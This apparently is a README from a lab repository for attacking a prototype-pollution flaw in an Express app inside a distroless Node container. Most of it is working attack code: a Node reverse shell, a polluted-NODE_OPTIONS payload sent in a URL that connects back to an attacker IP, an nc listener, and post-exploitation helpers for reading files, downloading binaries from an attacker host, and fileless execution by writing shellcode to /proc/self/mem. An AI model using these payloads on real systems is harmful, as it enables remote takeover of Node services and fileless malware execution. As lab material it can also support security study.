## Build distroless
```bash
cd express-pp
docker build . -t node-pp-dless
docker run -p 3000:3000 node-pp-dless
```

## Raw image (no distroless)
```bash
docker run -it node:18 bash
```

## Get node rev shell

### PP Payload

```js
// This is the clear-text reverse shell code:
net=require(`net`);
cp=require(`child_process`);
sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true}); //Detach so when parent dies the rev doesn't die
client = new net.Socket();
client.connect(4446, `127.0.0.1`, function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});

// This is the final payload
pp_pay = JSON.parse('{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\\"child_process\\\").fork(\\\"-e\\\",[\\\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4446, `127.0.0.1`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\\\"],{\\\"env\\\":{\\\"NODE_OPTIONS\\\":\\\"\\\"}}).toString())//"}}}');
// Note how NODE_OPTIONS is clear for the new process to avoid an infinite loop of process being created
```

### Get rev shell

**Start a listener** on your machine:

```bash
nc -lvnp 4444
```

Get **node reverse shell** (change your IP and port):

```bash
http://127.0.0.1:3000/?exec=1&data={"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\"child_process\").fork(\"-e\",[\"net=require(`net`);cp=require(`child_process`);sh=cp.spawn(`/proc/self/exe`, [`-i`], {detached: true});client = new net.Socket();client.connect(4444, `172.17.0.2`, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});//\"],{\"env\":{\"NODE_OPTIONS\":\"\"}}).toString())//"}}}
```

**You should have received the node shell!**

Check in the following section how to **load and execute arbitrary binaries**.

## Node utilities

### Get OS info
```js
os = require("os")
os.userInfo() //user info
os.tmpdir() // tmp directory
os.platform();
os.release();
os.arch();
os.networkInterfaces() // network info
```


### List directory
```js
path = require('path');
fs = require('fs');

function ls(path){
    fs.readdir(path, { withFileTypes: true }, function (err, files) {
        if (err) {
            return console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            console.log(file); 
        });
    });
}
```

### Read file
```js
fs = require('fs');
function read_file(path){
    console.log(fs.readFileSync(path, {encoding:'utf8', flag:'r'}))
}
```

### Read file in base64
```js
fs = require('fs');
function read_fileb64(path){
    let data = fs.readFileSync(path, {encoding:'utf8', flag:'r'}).toString()
    console.log(Buffer.from(data).toString('base64'));
}
```

### Http request

```js
// Get headers and response text
function http_req(url){
    fetch(url).then(response=>{console.log(response.headers); response.text().then(data=>{console.log(data);})})
}
```

### Download and write file

```js
//https://stackoverflow.com/questions/11944932/how-to-download-a-file-with-node-js-without-using-third-party-libraries

http = require('http'); // USE 'https' for https:// URLs !!!
fs = require('fs');

var download = function(url, dest) {
  var file = fs.createWriteStream(dest);
  var request = http.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
      file.close();
    });
  });
};

download("http://172.17.0.2:8000/bin/ls", "/proc/96/fd/20")
```

### In memory execution

```js
// Imports
fs = require('fs');
path = require('path');
http = require('http');
https = require('https');
const { fork } = require('child_process');

// Code to execute a fork process taht will execute a shellcode with memfd_create
node_subp1_path = "/dev/shm/subp1.js"

// memfd_create shellcode from https://github.com/arget13/DDexec (this is the one for ARM)
var node_subp1 = `
fs = require('fs');
var data = fs.readFileSync('/proc/self/syscall', {encoding:'utf8', flag:'r'});
var mem_addr = data.split(" ")[8].trim();
var dec_offset = Number(mem_addr);
var shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
var shellcode = Buffer.from(shellcode_b64, 'base64');
fs.open('/proc/self/mem', 'a', function(err, fd) {
    fs.write(fd, shellcode, 0, shellcode.length, dec_offset, function(err,writtenbytes){});
})
`

fs.writeFileSync(node_subp1_path, node_subp1);

// Make a subprocess execute the memfd_create shellcode
var proc = fork(node_subp1_path, [], {"execPath": "/proc/self/exe", "argv0": "nodejs"});

console.log(`Check in /proc/${proc.pid}/fd (memfd is probably the biggest number)`);

// Find the memfd fd
function get_memfd_num(path){
    fs.readdir(path, function (err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
        } 
        files.forEach(function (file) {
            fs.readlink(path + "/" + file, (err, target) => {
                if (!err){
                    if (target.includes("/memfd:"))
                        console.log(path + "/" + file + " -> " + target)
                }
            });
        });
    });
}
get_memfd_num(`/proc/${proc.pid}/fd`);

// Download the binary to execute in the fd
var download = function(url, dest) {
  var file = fs.createWriteStream(dest);
  var request = https.get(url, function(response) {
    response.pipe(file);
    file.on('finish', function() {
        console.log("closed")
        file.close();
    });
  });
};
download("https://storage.googleapis.com/kubernetes-release/release/v1.25.3/bin/linux/arm64/kubectl", "/proc/45/fd/20")

// Execute the fd directly from the exec syscall
fork("", [], {"execPath": "/proc/45/fd/20", "execArgv": []})
```